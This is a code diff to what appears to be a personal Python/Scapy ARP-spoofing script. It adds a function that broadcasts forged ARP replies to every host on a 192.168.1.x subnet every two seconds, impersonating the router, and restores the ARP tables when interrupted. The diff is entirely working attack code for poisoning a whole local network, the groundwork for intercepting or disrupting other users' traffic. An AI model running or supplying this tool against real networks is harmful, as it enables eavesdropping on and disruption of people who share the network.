@@ -25,6 +25,58 @@ def restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac):
     sendp(pkt, iface=iface, count=5, verbose=False)
     #sends my phone a packet saying what the routers IP and shit is
 
+
+
+def spoof_all(spoofed_ip):
+
+    subnet_prefix = "192.168.1."
+    #set up the starting prefix
+
+    spoofed_mac = get_mac(spoofed_ip)
+    
+
+    if not spoofed_mac:
+        print(f"could not get MAC for spoofed IP: {spoofed_ip}")
+        return
+
+    print(f"spoofing all devices on subnet as {spoofed_ip}...")
+
+    while True:
+        try:
+            for i in range(2, 255):  #skip .0 (network) and .1 (router itself)
+                target_ip = subnet_prefix + str(i)
+                #so each POSSIBLE device send a ping saying im the router
+                if target_ip == spoofed_ip:
+                    continue  
+                #skip spoofing the router itself
+
+                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+                    op=2,
+                    psrc=spoofed_ip,
+                    pdst=target_ip,
+                    hwdst="ff:ff:ff:ff:ff:ff"
+                )
+                sendp(pkt, iface=iface, verbose=False)
+                #this is the ARP packet
+
+            time.sleep(2)  
+            #repeat every 2 seconds
+
+        except KeyboardInterrupt:
+            print("\nAll spoofing stopped. Restoring ARP tables...")
+            for i in range(2, 255):
+                target_ip = subnet_prefix + str(i)
+                if target_ip == spoofed_ip:
+                    continue  # skip restoring for the spoofed device itself
+                target_mac = get_mac(target_ip)
+                if target_mac:
+                    restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)
+
+
+
+
+
+
 def start_spoofer(spoofed_ip, target_ip):
     target_mac = get_mac(target_ip)
     spoofed_mac = get_mac(spoofed_ip)
